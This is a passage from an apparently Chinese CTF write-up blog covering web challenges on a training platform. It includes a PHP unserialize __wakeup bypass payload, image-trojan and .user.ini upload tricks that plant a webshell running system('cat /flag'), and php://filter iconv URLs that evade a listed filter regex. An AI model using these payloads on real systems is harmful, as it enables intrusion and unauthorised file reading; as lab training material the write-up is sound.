language-markup\" data-language=\"markup\"><code class=\"language-markup\">function $()&#123;\nvar e=document.getElementById(\"c\").value;\nif(e.length==16)\n   if(e.match(/^be0f23/)!=null)\n      if(e.match(/233ac/)!=null)\n         if(e.match(/e98aa$/)!=null)\n             if(e.match(/c7be9/)!=null)&#123;\n             var t=[\"fl\",\"s_a\",\"i\",\"e&#125;\"];\n             var n=[\"a\",\"_h0l\",\"n\"];\n             var r=[\"g&#123;\",\"e\",\"_0\"];\n             var i=[\"it'\",\"_\",\"n\"];\n             var s=[t,n,r,i];\n             for(var o=0;o&lt;13;++o)&#123;\n             document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;\n             &#125;\n&#125;\ndocument.write('<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>c<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token attr-name\">οnclick</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>$()</span><span class=\"token punctuation\">></span></span>Ok<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span>');\ndelete _<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们的终极目标是打印出</p>\n<p><code>document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;</code></p>\n<p>因此我们要满足关键变量e的条件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">e.length&#x3D;&#x3D;16\ne.match(&#x2F;^be0f23&#x2F;)!&#x3D;null\ne.match(&#x2F;233ac&#x2F;)!&#x3D;null\ne.match(&#x2F;e98aa$&#x2F;)!&#x3D;null\ne.match(&#x2F;c7be9&#x2F;)!&#x3D;null<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里又用到了正则表达式<br><u>^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa</u>，其它的只要匹配到就好，没有位置要求<br>于是我们构造e的值</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">e&#x3D;be0f233ac7be98aa<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>将上面的核心代码后缀改为html格式，打开如下图所示<br>在这里插入图片描述<br>框中输入e的值<code>be0f233ac7be98aa</code>，点击Ok（当然你也可以在原来获得的web100文件浏览器执行的输入框中输入be0f233ac7be98aa）</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190624211524604.png\" alt=\"在这里插入图片描述\"></p>\n<p><strong>注1：当然，如果大家觉得构造麻烦，可以直接执行获取flag的核心代码，代码如下</strong></p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n<span class=\"token keyword\">var</span> t<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"fl\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"s_a\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"i\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"e&#125;\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n             <span class=\"token keyword\">var</span> n<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"_h0l\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"n\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n             <span class=\"token keyword\">var</span> r<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"g&#123;\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"e\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"_0\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n             <span class=\"token keyword\">var</span> i<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"it'\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"_\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"n\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n             <span class=\"token keyword\">var</span> s<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span>t<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n             <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> o<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>o<span class=\"token operator\">&lt;</span><span class=\"token number\">13</span><span class=\"token punctuation\">;</span><span class=\"token operator\">++</span>o<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n             document<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span>o<span class=\"token operator\">%</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">[</span>o<span class=\"token operator\">%</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">splice</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">document.write(s[o%4][0]);s[o%4].splice(0,1);\n&#x2F;&#x2F;输出fl;随后删除fl\n&#x2F;*\n代码运行详解：\n第一步：document.write(s[0][0]);s[0].splice(0,1);\n第二步：document.write(t[0]);t.splice(0,1);\n第三步：document.write(&quot;fl&quot;);删除t[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;]中第一个位置，一个项目，即删除fl\n*&#x2F;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">document.write的功能可以看一下这篇文章https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_34986769&#x2F;article&#x2F;details&#x2F;52160532<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">splice() 方法向&#x2F;从数组中添加&#x2F;删除项目，然后返回被删除的项目。\n注释：该方法会改变原始数组。\n语法\narrayObject.splice(index,howmany,item1,.....,itemX)\n参数\t                         描述\nindex\t                     必需。整数，规定添加&#x2F;删除项目的位置，使用负数可从数组结尾处规定位置。\nhowmany\t                     必需。要删除的项目数量。如果设置为 0，则不会删除项目。\nitem1, ..., itemX\t         可选。向数组添加的新项目。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"13-unserialize3\"><a href=\"#13-unserialize3\" class=\"headerlink\" title=\"13.unserialize3\"></a>13.unserialize3</h2><h3 id=\"1-题目描述-22\"><a href=\"#1-题目描述-22\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2）wp-7\"><a href=\"#2）wp-7\" class=\"headerlink\" title=\"2）wp\"></a>2）wp</h3><p>这道题需要了解<a href=\"../../../../2022/05/28/Web-study\">php反序列化</a>中__wakeup漏洞的利用,还有<a href=\"../../../../2022/05/28/Web-study\">php魔术方法</a></p>\n<p><code>__wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</code></p>\n<p>开始的代码不完整，是一段残缺的PHP代码，根据题目名字知道这是给反序列化的题目，?code&#x3D;可能是提醒需要在url利用以GET方式提交code值</p>\n<p><img src=\"https://img-blog.csdnimg.cn/669297deb27d4dce9bbdac477d78c6b7.png\" alt=\"在这里插入图片描述\"></p>\n<p>下方是把代码补充完善后，并并调用序列化函数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">xctf</span><span class=\"token punctuation\">&#123;</span>                        <span class=\"token comment\">//定义一个名为xctf的类</span>\n<span class=\"token keyword\">public</span> <span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'111'</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">//定义一个公有的类属性$flag，值为111</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>                                \n<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'bad requests'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">xctf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    \n<span class=\"token comment\">//使用new运算符来实例化该类（xctf）的对象为</span>\n<span class=\"token comment\">//这里也就是定义了了一个新的类用来反序列化</span>\n\n<span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       \n<span class=\"token comment\">//serialize()序列化函数</span>\n<span class=\"token comment\">//输出被序列化的对象</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>运行该php代码，得到序列化后的字符串</p>\n<p><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>\n<p><img src=\"/post/wp-Gongfang/image-20220627215806623.png\" alt=\"image-20220627215806623\"></p>\n<p>如果看不懂，可以看看方便下图理解</p>\n<p><img src=\"https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16\"></p>\n<p>这里如果直接访问，会失败</p>\n<p><code>http://111.200.241.244:54024/?code=O:4:%22xctf%22:1:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</code></p>\n<p><img src=\"/post/wp-Gongfang/image-20220627220136916.png\" alt=\"image-20220627220136916\"></p>\n<p>因为我们忽略了<code>__wakeup()</code>，这里就需要了解php的魔术方法当中的绕过__wakeup()</p>\n<p><code>如何绕过__wakeup()：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。从而绕过了__wakeup()函数</code></p>\n<p>在这串序列化的代码中，对象属性数为1，把下列的1改为2(&gt;1)，即可</p>\n<p><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>\n<p>–&gt;</p>\n<p><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>\n<hr>\n<p>这里我插入一个新学到的payload</p>\n<p><code>C:4:&quot;xctf&quot;:0:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>\n<p>发现也是可以的，也是可以绕过<code>__wakeup()</code>函数</p>\n<p>C代表这个类实现了serializeable接口，serializeable不支持wakeup，就绕过去了</p>\n<hr>\n<p>然后payload:</p>\n<p><code>http://111.200.241.244:54024/?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</code></p>\n<p>得到flag</p>\n<p>补充：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">php实例化：是指在面向对象的编程中，把用类创建对象的过程称为实例化，是将一个抽象的概念类，具体到该类实物的过程，实例化过程中一般由【类名 对象名 &#x3D; new 类名（参数1，参数2...参数n）】构成。\n\nphp类对象是什么意思？\n类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。\n对象 − 是类的实例。\n在面向对象的程序设计（英语：Object-oriented programming，缩写：OOP）中，对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。在现实世界里我们所面对的事情都是对象，如计算机、电视机、自行车等。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"14-upload1\"><a href=\"#14-upload1\" class=\"headerlink\" title=\"14.upload1\"></a>14.upload1</h2><h3 id=\"1-题目描述-23\"><a href=\"#1-题目描述-23\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-16\"><a href=\"#2-wp-16\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>典型的文件上传漏洞，可以先把upload-labs线下靶场学习一下</p>\n<p>先直接上传php文件，发现被拦截</p>\n<p><img src=\"/post/wp-Gongfang/image-20220704104557362.png\" alt=\"image-20220704104557362\"></p>\n<p>于是构造一个图片木马上传，然后burp修改后缀，看看是不是前端验证</p>\n<p><img src=\"/post/wp-Gongfang/image-20220704104752019.png\" alt=\"image-20220704104752019\"></p>\n<p><img src=\"/post/wp-Gongfang/image-20220704104814064.png\" alt=\"image-20220704104814064\"></p>\n<p>发现上传成功</p>\n<p><img src=\"/post/wp-Gongfang/image-20220704104830480.png\" alt=\"image-20220704104830480\"></p>\n<p>用蚁剑试着连一下</p>\n<p><img src=\"/post/wp-Gongfang/image-20220704105115729.png\" alt=\"image-20220704105115729\"></p>\n<p>发现连接成功，打开看看，在html下发现flag.php</p>\n<p><img src=\"/post/wp-Gongfang/image-20220704105139801.png\" alt=\"image-20220704105139801\"></p>\n<p>打开文件</p>\n<p>得到flag</p>\n<hr>\n<p>后面的题难度飞升，水平有限，后面的题仅写一些个人笔记，建议认真阅读其他大佬的wp，遇到难点，建议先巩固概念基础</p>\n<h2 id=\"15-easytornado\"><a href=\"#15-easytornado\" class=\"headerlink\" title=\"15.easytornado\"></a>15.easytornado</h2><p>一道tornado框架题，属于ssti注入，建议先看一些文章</p>\n<p>了解了再尝试完成</p>\n<h1 id=\"Others\"><a href=\"#Others\" class=\"headerlink\" title=\"Others\"></a>Others</h1><h2 id=\"1-easyupload\"><a href=\"#1-easyupload\" class=\"headerlink\" title=\"1.easyupload\"></a>1.easyupload</h2><h3 id=\"1-题目描述-24\"><a href=\"#1-题目描述-24\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>一名合格的黑客眼中，所有的上传点都是开发者留下的后门</p>\n<h3 id=\"2-wp-17\"><a href=\"#2-wp-17\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p><u><em>这道题写的1星，但是过滤又多，还涉及了上传.user.ini文件，学到了,下面是大佬的wp</em></u></p>\n<p>本题需要利用文件上传漏洞点，通过绕过服务器的安全防护，达到getshell的目的</p>\n<p>本题的主要考点为利用fastcgi的.user.ini特性进行任意命令执行</p>\n<p>这里需要绕过的点如下</p>\n<ul>\n<li>检查文件内容是否有php字符串</li>\n<li>检查后缀中是否有htaccess或ph</li>\n<li>检查文件头部信息</li>\n<li>文件MIME类型</li>\n</ul>\n<p>对于第一点可以利用短标签绕过，例如 <?=phpinfo();?></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">\n把short_open_tag 字段改为On，就可以实现短标签功能\n\n短标签：\n1.能正常解析类似于这样形式的php文件： phpinfo() ?&gt;  \n\n2.使用&lt;?&#x3D;$a?&gt;的形式输出，在短标签看来，&lt;?&#x3D;$a?&gt;\n\n3.&lt;?&#x3D;(表达式)?&gt;\n就相当于\n&lt;?php echo $a?&gt;\n&lt;?php echo (表达式)?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">正确：\n&lt;?\n$a &#x3D; 123;\neval(&#39; phpinfo();?&gt;&lt;? echo $a ?&gt;&#39;)\n?&gt;\n\n报错：\n&lt;?\n$a &#x3D; 123;\neval(&#39;&lt;? phpinfo();?&gt;&lt;?&#x3D;$a ?&gt;&#39;)\n?&gt;\n\n从这个对比试验我们可以看出：\n在短标签模式下，\n我们执行php语句php函数，都用类似于这样形式的php文件：\nphpinfo();?&gt;\n但是我们要输出一个flag，或者变量时，使用&lt;?&#x3D;$a?&gt;的形式输出<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>对于第二点可以通过上传.user.ini以及正常jpg文件来进行getshell,可以参考以下文章</p>\n<p><a href=\"https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html\">文章</a></p>\n<p>在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。</p>\n<p> 这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。</p>\n<p> 其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。</p>\n<p>第三点绕过方式即在文件头部添加一个图片的文件头，比如<code>GIF89a</code></p>\n<p>第四点绕过方法即修改上传时的Content-Type</p>\n<p>因此最终的payload为：<br> 上传.user.ini，内容为</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">GIF89a                  \nauto_prepend_file&#x3D;a.jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">auto_append_file、auto_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 \n\n使用方法很简单，直接写在.user.ini中：<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>上传a.jpg，内容为</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">GIF89a\n&lt;?&#x3D;system(&#39;cat &#x2F;flag&#39;);?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h2 id=\"2-file-include【江苏工匠杯】\"><a href=\"#2-file-include【江苏工匠杯】\" class=\"headerlink\" title=\"2.file_include【江苏工匠杯】\"></a>2.file_include【江苏工匠杯】</h2><h3 id=\"1-题目描述-25\"><a href=\"#1-题目描述-25\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>怎么读取文件呢？</p>\n<h3 id=\"2-wp-18\"><a href=\"#2-wp-18\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>这是一道文件包含的题目</p>\n<p>但是开始一直用伪协议读取都失败</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;61.147.171.105:61462&#x2F;?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64&#x2F;resource&#x3D;flag.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/wp-Gongfang/image-20230104221540491.png\" alt=\"image-20230104221540491\"></p>\n<p>根据源码猜测，是在<code>check.php</code>中设置了过滤，但是直接访问是无法得到文件内容的</p>\n<p>这里涉及到一个知识点</p>\n<h4 id=\"Conversion-Filters（转换过滤器）\"><a href=\"#Conversion-Filters（转换过滤器）\" class=\"headerlink\" title=\"Conversion Filters（转换过滤器）\"></a>Conversion Filters（转换过滤器）</h4><p><code>Conversion Filters</code>（转换过滤器）如同 <code>string.</code> 过滤器，<code>convert.</code> 过滤器的作用就和其名字一样。转换过滤器是 <code>PHP 5.0.0</code> 添加的。</p>\n<p>常用的<code>convert.base64</code>就是其应用</p>\n<p>但是我们这里测试可以知道</p>\n<p><img src=\"/post/wp-Gongfang/image-20230104222154684.png\" alt=\"image-20230104222154684\"></p>\n<p>这里将<code>base64</code>过滤了，也就是不能进行<code>base64</code>转化，<code>read</code>也不能用</p>\n<p>于是这里就提及了</p>\n<h5 id=\"convert-iconv\"><a href=\"#convert-iconv\" class=\"headerlink\" title=\"convert.iconv.*\"></a>convert.iconv.*</h5><p>这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p>\n<p>使用方法</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; \nor \nconvert.iconv.&lt;input-encoding&gt;&#x2F;&lt;output-encoding&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>相比单纯的<code>convert.</code>加上<code>.iconv</code>后，可以将数据进行转化后，再进行转化输出</p>\n<p>而其能进行加码的方式有</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">UCS-4*\nUCS-4BE\nUCS-4LE*\nUCS-2\nUCS-2BE\nUCS-2LE\nUTF-32*\nUTF-32BE*\nUTF-32LE*\nUTF-16*\nUTF-16BE*\nUTF-16LE*\nUTF-7\nUTF7-IMAP\nUTF-8*\nASCII*<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>但是这些加码方式也有些被过滤</p>\n<p>进行爆破得到<code>UTF-7，UCS-4*</code>可以</p>\n<p>直接构造</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;61.147.171.105:61462&#x2F;?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-7.UCS-4*&#x2F;resource&#x3D;flag.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>得到<code>flag</code></p>\n<p><img src=\"/post/wp-Gongfang/image-20230104223717245.png\" alt=\"image-20230104223717245\"></p>\n<hr>\n<p>查看一下<code>check.php</code>内容</p>\n<p><img src=\"/post/wp-Gongfang/image-20230104223436793.png\" alt=\"image-20230104223436793\"></p>\n<p>发现过滤了</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">base|be|encode|print|zlib|quoted|write|rot13|read|string\n\n看到这里过滤了quoted，string，所以这里的转化过滤器函数用的iconv()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n","text":"这个线上靶场感觉很适合入门，而且难度分布也好，很优秀的线上靶场，非常值得仔细学习研究一下 ...功防世界突然改版了，把题弄成一堆了，不过还是有难度系数，不过也方...","permalink":"/post/wp-Gongfang","photos":[],"count_time":{"symbolsCount":"30k","symbolsTime":"27 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"靶场","slug":"靶场","count":5,"path":"api/tags/靶场.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Web%E6%96%B0%E6%89%8B\"><span class=\"toc-text\">Web新手</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-view-source\"><span class=\"toc-text\">1.view_source</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-robots\"><span class=\"toc-text\">2.robots</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-1\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-backup\"><span class=\"toc-text\">3.backup</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-2\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4-cookie\"><span class=\"toc-text\">4.cookie</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-3\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%EF%BC%89wp\"><span class=\"toc-text\">2）wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5-disabled-button\"><span class=\"toc-text\">5.disabled_button</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-4\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-3\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#6-weak-auth\"><span class=\"toc-text\">6.weak_auth</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-5\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-4\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#7-simple-php\"><span class=\"toc-text\">7.simple_php</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-6\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-5\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#8-get-post\"><span class=\"toc-text\">8.get_post</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-7\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%EF%BC%89wp-1\"><span class=\"toc-text\">2）wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#9-xff-referer\"><span class=\"toc-text\">9.xff_referer</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-8\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-6\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#10-webshell\"><span class=\"toc-text\">10.webshell</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-9\"><span 